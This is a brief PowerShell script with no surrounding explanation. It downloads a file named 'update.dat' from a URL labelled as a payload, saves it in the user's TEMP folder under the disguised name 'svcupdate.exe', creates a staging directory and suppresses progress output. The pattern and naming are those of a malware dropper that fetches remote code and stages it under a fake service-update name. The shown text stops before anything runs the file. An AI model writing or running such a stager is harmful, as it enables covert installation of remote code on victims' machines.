$PayloadUrl = 'https://contoso.com/assets/update.dat'
$DropPath = "$env:TEMP\svcupdate.exe"
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $DropPath)
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$ProgressPreference = "SilentlyContinue"
